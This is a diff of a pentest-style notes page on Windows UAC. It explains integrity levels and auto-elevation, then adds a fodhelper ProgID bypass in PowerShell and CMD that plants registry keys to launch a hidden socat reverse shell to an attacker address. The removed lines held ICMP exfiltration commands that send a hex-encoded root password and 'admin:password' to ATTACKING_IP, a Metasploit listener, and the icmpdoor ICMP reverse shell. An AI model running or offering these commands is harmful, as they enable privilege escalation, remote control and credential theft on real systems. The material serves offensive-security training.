@@ -6,7 +6,7 @@ The User Account Control [UAC](https://learn.microsoft.com/en-us/windows/securit
 
 ### Integrity Levels
 
-UAC is a **Mandatory Integrity Control** (MIC), which is a mechanism that allows differentiating users, processes and resources by assigning an Integrity Level (IL) to each of them. In general terms, users or processes with a higher IL access token will be able to access resources with lower or equal ILs. MIC takes precedence over regular Windows DACLs
+UAC is a **Mandatory Integrity Control** (MIC), which is a mechanism that allows differentiating users, processes and resources by assigning an Integrity Level (IL) to each of them. In general terms, users or processes with a higher IL access token will be able to access resources with lower or equal ILs. MIC takes precedence over regular Windows DACLs  
 The following 4 ILs are used by Windows, ordered from lowest to highest:  
 
 | Integrity Level         | Use                                                 |
@@ -16,61 +16,55 @@ The following 4 ILs are used by Windows, ordered from lowest to highest:
 | High                    | Administrators' elevated tokens if UAC is enabled.  |
 | System                  | Reserved for system use.                            |
 
+### AutoElevate 
+some executables can auto-elevate, achieving high IL without any user intervention. This applies to most of the Control Panel's functionality and some executables provided with Windows. For an application, some requirements need to be met to auto-elevate:  
+    - The executable must be signed by the Windows Publisher  
+    - The executable must be contained in a trusted directory, like %SystemRoot%/System32/ or %ProgramFiles%/  
+    - Executable files (.exe) must declare the autoElevate element inside their manifests. To check a file's manifest, we can use sigcheck.  
+
+Indeed we can leverage this executables to bypass UAC. Let's dive in:  
+{% hint style="danger" %}
+if UAC is configured on the "Always Notify" level, fodhelper and similar apps won't be of any use as they will require the user to go through the UAC prompt to elevate.
+{% endhint %}
 
 ## Practice
 
+ Microsoft doesn't consider UAC a security boundary but rather a simple convenience to the administrator to avoid unnecessarily running processes with administrative privileges. In that sense any bypass technique is not considered a vulnerability to Microsoft, and therefore some of them remain unpatched to this day.
+
+### Using ProgID to bypass UAC
+we will create an entry on the registry for a new progID of our choice (any name will do) and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using the ms-settings progID, it will notice the CurVer entry pointing to our new progID and check it to see what command to use.  
 {% tabs %}
-
-{% tab title="Manualy" %}
-We can, on linux targets, exfiltrate datas with the `-p` options of the `ping` command.  
+{% tab title="Powershell" %}
+The exploit code is proposed by [V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses)
 ```bash
-root@victime$ echo 'root:p@ssw0rd!' | xxd -p
-726f6f743a7040737377307264210a
+$program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
 
-root@victime$ ping ATTACKING_IP -c 1 -p 726f6f743a7040737377307264210a
-
+New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
+Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $program -Force
+    
+New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
+Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".pwn" -Force
+    
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
 ```
 {% hint style="danger" %}
-Note that the -p option is only available for **Linux operating systems**. We can confirm that by checking the ping's help manual page.
+Detected by Windowds Defender
 {% endhint %}
 {% endtab %}
 
-{% tab title="metasploit" %}
-let's set up the Metasploit framework by selecting the `icmp_exfil` module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the `BPF_FILTER` option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows.
-
+{% tab title="CMD" %}
+V3ded exploit converted in CMD by TryHackMe
 ```bash
-msf5 > use auxiliary/server/icmp_exfil
-msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKING_IP
-BPF_FILTER => icmp and not src ATTACKBOX_IP
+C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
 
-msf5 auxiliary(server/icmp_exfil) > run
+C:\> reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
+The operation completed successfully.
+
+C:\> reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
+The operation completed successfully.
+
+C:\> fodhelper.exe
 ```  
-  
-On the target, we can now exfiltrate data.  
-```bash
-#First, send the BOF trigger
-v4resk@victime$ sudo nping --icmp -c 1 ATTACKING_IP --data-string "BOFfile.txt"
-
-#Datas
-v4resk@victime$ sudo nping --icmp -c 1 ATTACKING_IP --data-string "admin:password"
-
-#EOF end signal
-v4resk@victime$ sudo nping --icmp -c 1 ATTACKING_IP --data-string "EOF"
-```
-{% endtab %}
-
-{% tab title="icmpdoor" %}
-[ICMPDoor](https://github.com/krabelize/icmpdoor) is an open-source reverse-shell written in Python3 and scapy. The tool uses the same concept we discussed earlier, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.  
-  
-On the victime machine:
-```bash
-victime@target$ sudo icmpdoor -i eth0 -d ATTACKING_IP
-```
-  
-On the attacking machine:
-```bash
-veresk@kali$ sudo icmp-cnc -i eth1 -d VICTIME_IP
-```
 {% endtab %}
 {% endtabs %}
 
